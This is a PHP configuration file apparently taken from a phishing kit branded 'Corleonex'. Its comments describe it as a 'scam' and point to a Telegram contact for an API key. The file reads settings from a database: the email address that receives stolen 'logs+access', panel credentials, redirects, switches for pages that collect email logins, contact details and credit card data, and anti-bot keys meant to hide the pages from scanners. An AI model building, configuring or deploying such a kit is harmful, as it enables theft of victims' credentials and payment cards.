<?php

error_reporting(0);
// these scam need api 

// request one from https://t.me/Corleonex

// DONT EDIT THESE PAGE ! 


require_once "db/SleekDB.php";


$dataDir = "admin/db";

if (preg_match('/(admin)/', getcwd())) {
   $dataDir = "db";
}

if (preg_match('/(Corleonex)/', getcwd())) {
   $dataDir = "../../admin/db";
}


$data = \SleekDB\SleekDB::store('data', $dataDir);


$user = $data->where( '_id', '=',  5 )->fetch();


// SPAM INFO

$yourname = $user[0]['yourname'];
$your_email = $user[0]['your_email']; // logs+access



// LOGIN INFO

$username = $user[0]['username'];
$password = $user[0]['password'];

// Redirect

$redirect = $user[0]['redirect'];


$corleonex_protection = $user[0]['corleonex_protection'];
$redirection = $user[0]['redirection'];
$show_start_page = $user[0]['show_start_page']; 
$show_email_access = $user[0]['show_email_access']; 
$show_contact_information = $user[0]['show_contact_information'];
$show_credit_card = $user[0]['show_credit_card'];
$show_success_page = $user[0]['show_success_page'];
$anti_bot = $user[0]['anti_bot'];
$show_page_id =  $user[0]['show_page_id'];
//

$detectbot_smart =  $user[0]['your_email'];

$numverifier = $user[0]['numverifier'];
$numverifier_api = $user[0]['numverifier_api'];

// KEY PROTECTION


$apikey =	$user[0]['apikey'];
$anti_bot_apikey =	$user[0]['anti_bot_apikey'];

// editable information

$warning_text = $user[0]['warning_text'];
$warning_button_text = $user[0]['warning_button_text'];




?>